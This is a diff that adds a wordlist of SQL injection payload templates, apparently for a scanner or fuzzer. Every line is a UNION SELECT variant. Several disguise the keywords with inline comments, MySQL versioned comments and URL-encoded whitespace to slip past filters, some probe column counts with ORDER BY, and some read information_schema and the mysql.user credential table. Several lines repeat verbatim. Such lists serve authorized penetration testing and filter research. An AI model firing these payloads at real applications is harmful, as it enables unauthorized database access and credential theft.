@@ -1,0 +1,43 @@
+union/**/select/**/{union}--
+union/*comment*/select/*comment*/{union}--
+union/*!50000select*/{union}--
+union%0Aselect%0A{union}--
+union%09select%09{union}--
+union%0Dselect%0D{union}--
+union/**/select/**/{union}--
+union/*random*/select/*random*/{union}--
+union/*!50000select*/{union}--
+union%0Aselect%0A{union}--
+union%09select%09{union}--
+union%0Dselect%0D{union}--
+union all select {union}--
+union distinct select {union}--
+union all select null,null,null--
+union select null,null,null--
+union select {union}--
+union select {union}--
+union select {union}--
+union select {union}--
+union select {union}--
+union select {union}--
+union select {union}--
+union select {union}--
+union select {union}--
+union select {union} where 1=1--
+union select {union} where 1=0--
+union select {union} from dual--
+union select {union} from information_schema.tables--
+union select {union} from information_schema.columns--
+union select {union} from mysql.user--
+union select {union}--+%23
+union select {union}--+%23
+union select {union}--+%23
+union select {union}--+%23
+union select {union}--+%23
+union select {union} limit 1--+%23
+union select {union} limit 1,1--+%23
+union select {union} order by 1--+%23
+union select {union} order by 2--+%23
+union select {union} order by 3--+%23
+union select {union} order by 4--+%23
+union select {union} order by 5--+%23
